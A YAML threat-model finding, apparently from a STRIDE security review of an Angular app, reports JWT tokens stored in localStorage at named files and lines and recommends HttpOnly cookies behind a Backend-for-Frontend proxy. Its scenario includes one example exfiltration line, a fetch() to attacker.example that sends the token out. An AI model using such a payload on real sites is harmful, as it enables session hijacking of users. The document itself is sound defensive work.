threats:
- local_id: angular-spa-005
  threat_category_id: TH-04
  additional_categories:
  - TH-11
  stride: Information Disclosure
  cwe: CWE-922
  title: JWT Session Token in localStorage — login.component.ts:101
  affected_parameter: token
  scenario: Both `login.component.ts:101` and `oauth.component.ts:52` write the JWT bearer token to `localStorage.setItem('token',
    ...)`. Browser localStorage is accessible to all JavaScript executing on the same origin. The multiple confirmed XSS vulnerabilities
    in this component (angular-spa-003, angular-spa-004) mean that any successful XSS payload can exfiltrate the JWT with
    a simple `fetch('https://attacker.example/steal?t=' + localStorage.getItem('token'))`. There is no BFF (Backend-for-Frontend)
    proxy pattern in use; the SPA holds raw bearer tokens rather than opaque session references. An `HttpOnly` cookie would
    prevent this exfiltration class entirely.
  evidence_summary: localStorage.setItem('token', ...) is called at login.component.ts:101 and oauth.component.ts:52; app.guard.ts:18
    and :35 confirm the token is later read back from localStorage for both auth checks and JWT decoding.
  impact_description: A successful XSS on any page in the application allows full session hijacking by extracting the JWT
    from localStorage, enabling the attacker to act as the victim until the token expires.
  likelihood: High
  impact: High
  risk: High
  controls_in_place: None — no HttpOnly cookie, no BFF proxy; token is directly accessible to JavaScript
  mitigation_title: Store session tokens in HttpOnly Secure SameSite=Strict cookies via a Backend-for-Frontend proxy
  remediation:
    effort: High
    steps:
    - 'Introduce a Backend-for-Frontend (BFF) layer: the Express backend sets the session JWT as an `HttpOnly; Secure; SameSite=Strict`
      cookie on the login response instead of returning it in the JSON body.'
    - Remove all `localStorage.setItem('token', ...)` calls in the SPA; the SPA sends cookies implicitly with each request.
    - 'Update Angular `HttpClient` requests to use `withCredentials: true` so the cookie is sent cross-origin where needed.'
    - Rotate session identifiers on privilege escalation events (role change, password change).
    code_example: null
    reference: CWE-922
  evidence:
  - file: frontend/src/app/login/login.component.ts
    line: 101
  evidence_check: verified
  controls_absent_evidence: []
  prior_finding_ref: null
  architectural_violation: true
  component_name: Angular SPA Frontend
  source: stride
  evidence_flags:
